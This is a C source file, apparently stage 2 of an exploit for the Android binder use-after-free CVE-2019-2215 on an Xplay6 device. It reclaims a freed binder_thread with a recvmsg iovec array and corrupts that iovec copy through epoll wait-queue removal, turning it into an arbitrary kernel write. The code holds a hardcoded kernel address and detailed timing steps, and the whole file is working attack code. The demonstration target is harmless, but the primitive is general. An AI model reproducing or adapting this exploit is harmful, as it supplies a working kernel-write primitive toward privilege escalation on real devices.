#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sched.h>

/* CVE-2019-2215 stage 2 for Xplay6: turn the corrupted iovec copy into a kernel
 * WRITE and prove whether that copy bypasses access_ok on this build.
 *
 * Choreography (see art/ledger-20261013.md S33 for how each constant was measured):
 *   parent: arm a sync transaction to handle 0, drain just BR_TRANSACTION_COMPLETE,
 *           epoll_ctl(ADD) so the entry links into &thread->wait (thread+0x48),
 *           BINDER_THREAD_EXIT -> kfree(binder_thread, kmalloc-512),
 *           recvmsg(MSG_WAITALL) with 25 iovecs -> verify_iovec() kmallocs 400 bytes
 *           into that same cache and refills the freed slot.
 *   child : sleep 1 (so the parent is parked inside the syscall with the copy alive),
 *           epoll_ctl(DEL) -> remove_wait_queue():
 *               slot+0x48 (lock)      0 -> 0x00010001  (== iovec[4].iov_len!)
 *               slot+0x50/0x58 (head) -> both = slotVA+0x50   (== iovec[5].base/.len)
 *           then writes three chunks:
 *     chunk1 (0x1000 + 0x10001 bytes) is consumed by iovec[3] and the now-enlarged
 *             iovec[4], leaving the iterator exactly at iovec[5];
 *     chunk2 (32 bytes) is memcpy'd to iovec[5].iov_base == slotVA+0x50, i.e. it
 *             rewrites iovec[5] and iovec[6] *inside the kernel copy*:
 *             new iovec[5] = {scratch, 32} so the iterator advance lands cleanly on
 *             iovec[6]; new iovec[6] = {target, 8};
 *     chunk3 (8 bytes) is then delivered to iovec[6].iov_base == target -> kernel write.
 *
 * Target is init_uts_ns.name.nodename: 65 bytes of pure string, so a mis-aimed 8-byte
 * write there is harmless, and success is instantly visible via `uname -n`.
 */
#define PAGE              0x1000
#define IOVEC_ARRAY_SZ    25
#define WQ                4            /* slot 0x48 = wait.lock = iovec[4].iov_len */
#define UAF_LOCK_POST     0x10001UL    /* value of that u32 after one lock/unlock */
#define BINDER_THREAD_EXIT 0x40046208u
#define BR_NOOP           0x720cu
#define BR_TRANSACTION_COMPLETE 0x7206u
#define BR_REPLY          0x80407203u
#define BR_TRANSACTION    0x80407202u

#define INIT_UTS_NS       0xffffffc00162deb8UL
#define NODENAME_OFF      0x45         /* kref(4) + sysname[65] */
#define WRITE_PAYLOAD     "XPLAY6\0\0" /* exactly 8 bytes */

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size;
    binder_size_t write_consumed;
    binder_uintptr_t write_buffer;
    binder_size_t read_size;
    binder_size_t read_consumed;
    binder_uintptr_t read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

static void pin0(void) { cpu_set_t s; CPU_ZERO(&s); CPU_SET(0, &s); sched_setaffinity(0, sizeof s, &s); }

static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm: rc=%d errno=%d\n", rc, errno); return rc; }

    for (int i = 0; i < 3; i++) {
        char rbuf[256];
        struct binder_write_read b2;
        size_t off = 0;
        int done = 0, reply = 0;
        memset(rbuf, 0, sizeof rbuf);
        memset(&b2, 0, sizeof b2);
        b2.read_size = sizeof rbuf;
        b2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &b2);
        while (off + 4 <= (size_t)b2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == BR_TRANSACTION_COMPLETE)
                done = 1;
            else if (c == BR_REPLY || c == BR_TRANSACTION) { reply = 1; off += 64; }
        }
        printf("  drain %d: rc=%d errno=%d rconsumed=%llu complete=%d reply=%d\n",
               i, rc, errno, (unsigned long long)b2.read_consumed, done, reply);
        if (rc)
            return rc;
        if (done && !reply)
            return 0;
        if (reply)
            return -1;
    }
    return -1;
}

int main(int argc, char **argv)
{
    unsigned long target = (argc > 1 && argv[1][0]) ? strtoul(argv[1], NULL, 0) : (INIT_UTS_NS + NODENAME_OFF);
    int rounds = argc > 2 ? atoi(argv[2]) : 4;
    int mode_pipe = argc > 3 && !strcmp(argv[3], "pipe");
    char *scratch, *pad, chunk2[32], chunk3[8];
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct msghdr msg;
    struct epoll_event ev = { .events = EPOLLIN };
    int epfd, r;

    setvbuf(stdout, NULL, _IONBF, 0);
    pin0();
    scratch = malloc(0x2000);
    pad = malloc(PAGE + UAF_LOCK_POST);
    if (!scratch || !pad) { perror("alloc"); return 1; }
    memset(scratch, 0, 0x2000);
    memset(pad, 0xAA, PAGE + UAF_LOCK_POST);

    /* chunk2 rewrites iovec[5] and iovec[6] inside the kernel's copy */
    memset(chunk2, 0, sizeof chunk2);
    *(unsigned long *)(chunk2 + 0)  = (unsigned long)scratch;         /* new e[5].base  */
    *(unsigned long *)(chunk2 + 8)  = 32;                             /* new e[5].len   */
    *(unsigned long *)(chunk2 + 16) = target;                         /* new e[6].base  */
    *(unsigned long *)(chunk2 + 24) = 8;                              /* new e[6].len   */
    memcpy(chunk3, WRITE_PAYLOAD, 8);

    epfd = epoll_create(1000);
    printf("stage2 target=%016lx payload=%s rounds=%d\n", target, WRITE_PAYLOAD, rounds);

    for (r = 0; r < rounds; r++) {
        int fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
        int socks[2] = { -1, -1 };
        int use_pipe = mode_pipe;
        pid_t pid;
        void *map;
        int b;

        printf("--- round %d (%s) ---\n", r, use_pipe ? "pipe/readv" : "socket/recvmsg");
        if (fd < 0) { perror("open binder"); return 1; }
        map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0);
        if (map == MAP_FAILED) { perror("mmap"); close(fd); return 1; }
        if (arm_pending_tx(fd)) { printf("  state not reached\n"); goto next; }
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("epoll_add"); goto next; }

        memset(iov, 0, sizeof iov);
        iov[3].iov_base = pad;              iov[3].iov_len = PAGE;
        iov[4].iov_base = pad;              iov[4].iov_len = 0;      /* the spinlock */
        iov[5].iov_base = scratch;          iov[5].iov_len = 32;
        iov[6].iov_base = scratch + 0x400;  iov[6].iov_len = 8;
        iov[24].iov_base = pad;             iov[24].iov_len = 0x20000;  /* budget */
        memset(&msg, 0, sizeof msg);
        msg.msg_iov = iov;
        msg.msg_iovlen = IOVEC_ARRAY_SZ;

        if (use_pipe) {
            if (pipe(socks)) { perror("pipe"); goto next; }
            fcntl(socks[0], F_SETPIPE_SZ, 16 * PAGE);
        } else if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) { perror("socketpair"); goto next; }
        pid = fork();
        if (pid < 0) { perror("fork"); goto next; }
        if (pid == 0) {
            prctl(PR_SET_PDEATHSIG, SIGKILL);
            close(socks[0]);
            sleep(1);
            if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev)) { perror("child del"); _exit(10); }
            close(fd);
            printf("CHILD: DEL done, writing chunk1\n");
            b = write(socks[1], pad, PAGE + UAF_LOCK_POST);
            printf("CHILD: chunk1 -> %d\n", b);
            usleep(200000);
            b = write(socks[1], chunk2, sizeof chunk2);
            printf("CHILD: chunk2 -> %d\n", b);
            usleep(200000);
            b = write(socks[1], chunk3, sizeof chunk3);
            printf("CHILD: chunk3 -> %d\n", b);
            usleep(200000);
            close(socks[1]);
            _exit(0);
        }
        close(socks[1]);
        alarm(30);
        if (ioctl(fd, BINDER_THREAD_EXIT, NULL)) { perror("THREAD_EXIT"); alarm(0); goto next; }
        if (use_pipe)
            b = readv(socks[0], iov, IOVEC_ARRAY_SZ);   /* blocks empty, keeps the copy alive */
        else
            b = recvmsg(socks[0], &msg, MSG_WAITALL);
        printf("  xfer -> %d errno=%d  (69633 = kernel-VA copy blocked, 69673 = chain ran)\n", b, errno);
        alarm(0);
        { int st = 0; waitpid(pid, &st, 0); printf("  child status=%d\n", st); }
        close(socks[0]);
next:
        close(fd);
        if (map != MAP_FAILED)
            munmap(map, 1 << 20);
    }
    printf("now check: uname -n  (expect %s if the write landed)\n", WRITE_PAYLOAD);
    return 0;
}
